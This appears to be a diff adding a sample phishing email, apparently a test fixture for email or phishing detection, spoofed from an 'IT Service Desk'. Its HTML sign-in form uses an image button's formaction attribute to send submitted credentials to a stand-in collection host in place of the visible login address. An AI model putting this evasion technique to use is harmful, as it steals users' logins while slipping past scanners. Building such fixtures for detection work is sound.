@@ -1,0 +1,8 @@
+From: "IT Service Desk" <security@security.example.edu>
+To: staff@example.edu
+Subject: Input Image Formaction
+Authentication-Results: mx.example.edu; spf=pass smtp.mailfrom=security.example.edu; dkim=pass header.d=security.example.edu; dmarc=pass
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+
+<html><body><p>Sign in.</p><form action="https://example.edu/login"><input type="image" formaction="https://harvest-credentials.test/collect" src="https://example.edu/button.png" alt="Sign in"></form></body></html>
